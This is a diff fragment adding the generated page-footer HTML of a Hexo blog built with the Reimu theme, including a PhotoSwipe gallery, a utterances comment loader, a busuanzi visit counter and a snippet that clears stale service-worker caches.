+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'IDCM-svg/HFTTC.github.io');
+        script.setAttribute('issue-term', 'pathname');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'utterances';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false,
+      utterances: false,
+      beaudar: false,
+      disqus: false,
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    Promise.all([
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        return Promise.all(registrations.map((registration) => registration.unregister()));
+      }),
+      ('caches' in window)
+        ? caches.keys().then((keys) => Promise.all(keys.map((key) => caches.delete(key))))
+        : Promise.resolve()
+    ]).then(() => {
+      if (!sessionStorage.getItem('sw-cache-cleared')) {
+        sessionStorage.setItem('sw-cache-cleared', '1');
+        window.location.reload();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
